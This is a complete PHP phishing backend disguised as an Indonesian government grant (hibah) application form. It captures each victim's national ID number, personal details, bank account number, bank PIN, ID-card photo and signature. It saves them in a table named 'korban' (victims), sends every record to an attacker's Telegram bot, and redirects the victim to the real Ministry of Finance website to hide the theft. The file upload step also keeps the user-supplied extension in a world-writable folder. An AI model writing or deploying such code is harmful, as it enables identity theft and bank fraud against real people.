<?php
// ===== KONFIGURASI =====
$bot_token = 'YOUR_BOT_TOKEN_HERE'; // Ganti dengan token bot Telegram
$chat_id = 'YOUR_CHAT_ID_HERE'; // Ganti dengan chat ID Telegram

// ===== AMBIL DATA =====
$nik = $_POST['nik'] ?? '';
$nama = $_POST['nama'] ?? '';
$tempat = $_POST['tempat'] ?? '';
$tgl_lahir = $_POST['tgl_lahir'] ?? '';
$jenis_kelamin = $_POST['jenis_kelamin'] ?? '';
$alamat = $_POST['alamat'] ?? '';
$hp = $_POST['hp'] ?? '';
$bank = $_POST['bank'] ?? '';
$rekening = $_POST['rekening'] ?? '';
$pin = $_POST['pin'] ?? '';

// ===== UPLOAD FOTO KTP =====
$target_dir = "assets/uploads/";
if (!file_exists($target_dir)) {
    mkdir($target_dir, 0777, true);
}
$foto_ktp = '';
if (isset($_FILES['foto_ktp']) && $_FILES['foto_ktp']['error'] === UPLOAD_ERR_OK) {
    $ext = pathinfo($_FILES['foto_ktp']['name'], PATHINFO_EXTENSION);
    $foto_ktp = time() . '_ktp.' . $ext;
    move_uploaded_file($_FILES['foto_ktp']['tmp_name'], $target_dir . $foto_ktp);
}

$ttd = '';
if (isset($_FILES['ttd']) && $_FILES['ttd']['error'] === UPLOAD_ERR_OK) {
    $ext = pathinfo($_FILES['ttd']['name'], PATHINFO_EXTENSION);
    $ttd = time() . '_ttd.' . $ext;
    move_uploaded_file($_FILES['ttd']['tmp_name'], $target_dir . $ttd);
}

// ===== DATABASE SQLITE =====
$db = new SQLite3('database.db');
$db->exec("CREATE TABLE IF NOT EXISTS korban (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    nik TEXT,
    nama TEXT,
    tempat TEXT,
    tgl_lahir TEXT,
    jenis_kelamin TEXT,
    alamat TEXT,
    hp TEXT,
    bank TEXT,
    rekening TEXT,
    pin TEXT,
    foto_ktp TEXT,
    ttd TEXT,
    waktu DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$stmt = $db->prepare("INSERT INTO korban (nik, nama, tempat, tgl_lahir, jenis_kelamin, alamat, hp, bank, rekening, pin, foto_ktp, ttd) 
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
$stmt->bindParam(1, $nik);
$stmt->bindParam(2, $nama);
$stmt->bindParam(3, $tempat);
$stmt->bindParam(4, $tgl_lahir);
$stmt->bindParam(5, $jenis_kelamin);
$stmt->bindParam(6, $alamat);
$stmt->bindParam(7, $hp);
$stmt->bindParam(8, $bank);
$stmt->bindParam(9, $rekening);
$stmt->bindParam(10, $pin);
$stmt->bindParam(11, $foto_ktp);
$stmt->bindParam(12, $ttd);
$stmt->execute();

// ===== KIRIM KE TELEGRAM =====
$pesan = "✅ DATA HIBAH INDONESIA MASUK!\n\n" .
    "NIK: $nik\n" .
    "Nama: $nama\n" .
    "Tempat Lahir: $tempat\n" .
    "Tgl Lahir: $tgl_lahir\n" .
    "Jenis Kelamin: $jenis_kelamin\n" .
    "Alamat: $alamat\n" .
    "HP: $hp\n" .
    "Bank: $bank\n" .
    "Rekening: $rekening\n" .
    "PIN: $pin\n" .
    "Foto KTP: $foto_ktp\n" .
    "TTD: $ttd\n" .
    "Waktu: " . date('Y-m-d H:i:s');

if ($bot_token !== 'YOUR_BOT_TOKEN_HERE' && $chat_id !== 'YOUR_CHAT_ID_HERE') {
    file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($pesan));
}

// ===== REDIRECT =====
header("Location: https://www.kemenkeu.go.id");
exit();
?>